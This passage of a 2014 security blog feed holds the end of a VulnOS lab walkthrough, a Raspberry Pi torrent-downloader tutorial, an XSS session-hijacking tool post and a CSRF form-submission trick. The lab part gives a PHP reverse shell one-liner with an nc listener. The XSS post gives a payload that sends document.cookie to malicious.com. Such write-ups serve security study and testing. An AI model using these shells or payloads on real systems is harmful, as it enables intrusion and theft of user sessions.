<p>And here is the output of the table <strong>user</strong> in <strong>Mysql</strong> database.</p>

<p><img src="http://paulsec.github.io/images/vulnos/mysql_users.png" width="75%" height="75%"/></p>

<h4>Access maintenance</h4>

<p>I decided to check Damn Vulnerable Web App at the address : <a href="http://192.168.56.105/DVWA-1.0.8/">http://192.168.56.105/DVWA-1.0.8/</a>
You can log in the page using the installation&rsquo;s credentials : admin/password.</p>

<p>Then, disable <strong>&ldquo;High&rdquo;</strong> security and you can do Remote Command Execution.
It&rsquo;s time to get a reverse shell !</p>

<p>On your machine, type :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -lvp 1337</span></code></pre></td></tr></table></div></figure>


<p>Because the Netcat version which is on the VM does not contain the <strong>-e</strong> option, I found a nice trick using PHP :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3");'
</span></code></pre></td></tr></table></div></figure>


<p>However, we don&rsquo;t have enough access&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure>


<p>Then, Thanks to D4rk, I created a cgi script in DVWA&rsquo;s folder:</p>

<p><img src="http://paulsec.github.io/images/vulnos/script_cgi.png" /></p>

<p>Using Webmin&rsquo;s exploit, just change <em>RPATH</em> to the new file and <strong>exploit</strong>.</p>

<p><img src="http://paulsec.github.io/images/vulnos/webmin_root_script_result.png" width="75%" height="75%"/></p>

<p>Hope you liked it and that you learnt something. :&ndash;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python + Transmission-daemon = Download easily your favorite TV Show]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/28/python-plus-transmission-daemon-equals-download-easily-your-favorite-tv-show/"/>
    <updated>2014-03-28T18:23:59+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/28/python-plus-transmission-daemon-equals-download-easily-your-favorite-tv-show</id>
    <content type="html"><![CDATA[<p>This post is about my last project : my <em>TV Show Manager</em>.</p>

<p>I decided to start it because I wanted something <strong>really</strong> simple to download my favorite TV Shows.
In this post, I&rsquo;ll explain step by step how to reproduce it at home.</p>

<p>Basically, with this tutorial you&rsquo;ll set up your <strong>Raspberry</strong> box by :</p>

<ul>
<li>Installing / set-uping transmission-daemon</li>
<li>Getting one of my latest project <a href="https://github.com/PaulSec/TVShowsManager">TVShowManager</a> that uses my <a href="https://github.com/PaulSec/eztv_api">EZTV Python API</a>.</li>
</ul>


<blockquote><p>Well.. let&rsquo;s start ?</p></blockquote>

<p>I&rsquo;m a <strong>Raspberry Pi</strong> enthusiast, so this project runs at home on a basic installation of <em>Raspbmc</em>.</p>

<p>First, you need to install <strong>transmission-remote</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sudo apt-get install transmission-daemon
</span></code></pre></td></tr></table></div></figure>


<p>The basic installation will launch a basic HTTP server.
Let&rsquo;s imagine the IP of your Raspberry server is : <strong>192.168.0.12</strong>.</p>

<p>The HTTP Server is accessible on the port 9091, like : <a href="http://192.168.0.12:9091/transmission/web/">http://192.168.0.12:9091/transmission/web/</a></p>

<p>To access this URL, there will be a .htaccess asking some credentials to access the page.</p>

<p>To display/update them, just access the settings.json configuration file :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sudo vim /etc/transmission-daemon/settings.json
</span></code></pre></td></tr></table></div></figure>


<p>And check for the variables <strong>rpc-username</strong> and <strong>rpc-password</strong>.
Moreover, if you want to send commands over the network, check the <strong>rpc-whitelist</strong> variable and add your private network range if you want to access it over the LAN, like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="s2">&quot;rpc-whitelist&quot;</span><span class="err">:</span> <span class="s2">&quot;127.0.0.1, 192.168.1.*&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<blockquote><p>After setting up Transmission-remote, what do we have to do ?</p></blockquote>

<p>Well, you need to get TVShowManager, one of my project : <a href="git@github.com:PaulSec/TVShowsManager.git">TVShowManager</a>.</p>

<p>Start by cloning the projet by using <strong>git</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>git clone git@github.com:PaulSec/TVShowsManager.git
</span></code></pre></td></tr></table></div></figure>


<p>Then, just go in the folder and see the files which are present :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">cd </span>TVShowsManager <span class="o">&amp;&amp;</span> ls
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>eztv_api</strong> : (Unofficial) Python API for the website EZTV.it.</li>
<li><strong>TVShowsManager.py</strong> : the launcher for this project</li>
<li><strong>config.ini</strong> : the most important because it contains all the configuration !</li>
</ul>


<blockquote><p>Setting up TVShowsManager</p></blockquote>

<p>To use it, you have to create a configuration file called <strong>config.ini</strong>, let&rsquo;s take an example :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>config<span class="o">]</span>
</span><span class='line'><span class="nv">username</span> <span class="o">=</span> myUsernameTr
</span><span class='line'><span class="nv">password</span> <span class="o">=</span> myPassword!!!
</span><span class='line'><span class="nv">ip</span> <span class="o">=</span> 192.168.0.12
</span><span class='line'><span class="nv">timer</span> <span class="o">=</span> 5
</span><span class='line'>
</span><span class='line'><span class="o">[</span>Vikings<span class="o">]</span>
</span><span class='line'><span class="nv">season</span> <span class="o">=</span> 1
</span><span class='line'><span class="nv">episode</span> <span class="o">=</span> 7
</span></code></pre></td></tr></table></div></figure>


<p>The first section is the <em><em>config</em></em> one.
You define different fields such as :</p>

<ul>
<li><em>Username</em>: Credentials to connect to your transmission.</li>
<li><em>Password</em>: Bis.</li>
<li><em>IP</em>: IP where your Transmission-remote is running</li>
<li><em>timer</em>: How many minutes you want to wait between 2 re-try.</li>
</ul>


<p>Then, the other sections are for your different tv show.
Based on this example, you&rsquo;re watching <em>Vikings</em> and stopped at the episode 7, season 1.</p>

<p>You can get those files on your Raspberry and the ip address will then be : <strong>127.0.0.1</strong> if transmission-daemon is running on it as well.</p>

<blockquote><p>Launch the app !</p></blockquote>

<p>To launch the app, after creating your own <strong>config.ini</strong> file, just type this command :</p>

<p><code>python TVShowsManager.py</code></p>

<p>And that&rsquo;s it !
If you want more details, I redacted a nice README for the project just <a href="https://github.com/PaulSec/TVShowsManager">here</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XSS Callback]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/20/xss-callback/"/>
    <updated>2014-03-20T17:50:34+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/20/xss-callback</id>
    <content type="html"><![CDATA[<p>This post deals with a project I developed : <a href="https://github.com/PaulSec/XSS-Callback/">XSS Callback</a>.</p>

<p>This is not going to be (at least, I hope) a boring post about XSS exploitation. No.</p>

<p>Well, one scenario of using XSS would be to steal victim&rsquo;s cookie and access the page through his session.
This technique is called <strong>Session Hijacking</strong>. Ok fair enough.</p>

<p>However, some issues are present using this technique, let&rsquo;s take an example :</p>

<ul>
<li>You target a website</li>
<li>Unfortunately, it&rsquo;s too late (or too early depending on your situation) and you go to sleep.</li>
<li>You wake up in the night and there are loads of victims&rsquo;s sessions. Great !</li>
</ul>


<p>The only problem : the user <em>might have logged out of the platform</em> <strong>or</strong> there might be a <em>timeout on the session</em>.</p>

<p><strong>What would you do next ? </strong>
Well.. nothing much. You got lot of data but they are useless now.</p>

<p>I had the idea to create a basic HTTP Server using <em>Node.js</em> that will trigger a procedure when it will be called.
When launching this server, a route has been created which has this format :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">http</span><span class="o">:</span><span class="c1">//malicious.com/cookie/&lt;my-cookie&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok.. I guess you got it.</p>

<p>You can now insert some malicious payload like this :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://malicious.com/cookie/&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The cookie will be inserted in the URL and loaded on the client-side.
This means that you can go to sleep without any fear : All the victims who will load this URL will trigger an event on the server.
The server will then execute the code you developed on the server-side (and log user cookies if you want to).</p>

<p>Moreover, the idea of this code is completely generic that you can adapt for all web applications and the only thing you now have to do is : <strong>write your own</strong> <em>offensive</em> module.
You&rsquo;ll be able to launch the Node.js server with your own module using this command :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">node</span> <span class="nx">server</span><span class="p">.</span><span class="nx">js</span> <span class="nx">path</span><span class="o">/</span><span class="nx">to</span><span class="o">/</span><span class="nx">my</span><span class="o">/</span><span class="nx">module</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using the strenght of Node.js and the amount of modules, you can manage to create any attack you want to perform really easily.</p>

<p>So.. hope you liked it and see you next time :&ndash;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dealing with HTML Submit's conflict]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/09/dealing-with-html-submits-conflict/"/>
    <updated>2014-03-09T21:49:34+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/09/dealing-with-html-submits-conflict</id>
    <content type="html"><![CDATA[<p>This first post is related with one of my project : CSRFT.
CSRFT is a Cross Site Request Forgery (CSRF) vulnerabilities Toolkit.</p>

<p>My toolkit allows you to exploit either GET and POST HTTP Requests.
During some testings, I had issues with some specific forms.</p>

<p>Let&rsquo;s take an example of such form :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://website.com/blog/&quot;</span> <span class="na">id=</span><span class="s">&quot;form&quot;</span> <span class="na">method=</span><span class="s">&quot;get&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;assistive-text&quot;</span> <span class="na">for=</span><span class="s">&quot;s&quot;</span><span class="nt">&gt;</span>Search<span class="nt">&lt;/label&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">&quot;field&quot;</span> <span class="na">id=</span><span class="s">&quot;s&quot;</span> <span class="na">name=</span><span class="s">&quot;s&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Search&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">value=</span><span class="s">&quot;Search Value&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">&quot;submit&quot;</span> <span class="na">id=</span><span class="s">&quot;searchsubmit&quot;</span> <span class="na">name=</span><span class="s">&quot;submit&quot;</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Search&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The code injected on the page to submit the form was like that :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#form&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure>


<p>However, the form was not submitted.</p>

<h2>Why ?</h2>

<p>After browsing the internet, I found that there was a conflict with the <strong>submit</strong> input.</p>

<p>Let&rsquo;s try to debug wih <strong>FireBug</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#form&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span><span class='line'><span class="nx">TypeError</span><span class="o">:</span> <span class="nx">$</span><span class="p">(...).</span><span class="nx">submit</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">a</span> <span class="kd">function</span>
</span></code></pre></td></tr></table></div></figure>


<p>And then :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#form&quot;</span><span class="p">).</span><span class="nx">submit</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;searchsubmit&quot;</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;Search&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As I said earlier, this is because there&rsquo;s a conflict with the <strong>Submit</strong> input.
When there&rsquo;s such input, it&rsquo;s then not possible to &ldquo;force&rdquo; the victim to send the payload.</p>

<h2>How to force submitting it ?</h2>

<p>To submit a form, you can use the <strong>native function</strong>.</p>

<p>Basic example :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">HTMLFormElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">submit</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;forum&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>With such example, the argument of the function is the selector of the form.
Here, you submit the first form that you find in the DOM.
Using this technique, I&rsquo;ve been able to &ldquo;overwrite&rdquo; those (conflicts) inputs and submit the form even if it contains some.</p>

<p>Have fun !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Starting my own blog]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/04/starting-my-own-blog/"/>
    <updated>2014-03-04T20:21:39+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/04/starting-my-own-blog</id>
    <content type="html"><![CDATA[<p>Starting my own blog has been something I really wanted to do.
I&rsquo;ll add post related to my different projects but also on Web security.</p>

<p>Here are my different motivations :</p>

<h4>1. Provide a portfolio of my different projects.</h4>

<h4>2. Explain some problems I had and provide the solution</h4>

<h4>3. Talk about some geek stuffs. Let&rsquo;s see :)</h4>

<p>Hope you&rsquo;ll have fun to read me.
Cheers and see you soon.</p>
]]></content>
  </entry>
  
</feed>
